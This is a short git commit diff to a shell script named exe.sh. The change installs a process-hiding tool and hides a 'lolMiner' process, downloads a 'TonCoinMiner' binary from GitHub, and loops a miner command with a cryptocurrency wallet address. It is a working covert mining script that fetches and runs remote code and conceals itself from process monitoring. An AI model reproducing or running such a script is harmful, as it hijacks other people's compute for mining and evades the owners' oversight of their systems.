f5946241d14e4f2aca831d27ef3779a1fe3e84e0
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 07:21:27 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,7 +2,10 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 69 87
-wget https://github.com/d-crypto99/Bemiii/raw/main/mantapuu
-wget https://raw.githubusercontent.com/d-crypto99/Bemiii/main/gpu-nvidia.sh
-chmod +x gpu-nvidia.sh
-./gpu-nvidia.sh
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
+wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoinMiner
+while [ 1 ]; do
+./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
+sleep 5
+
+done
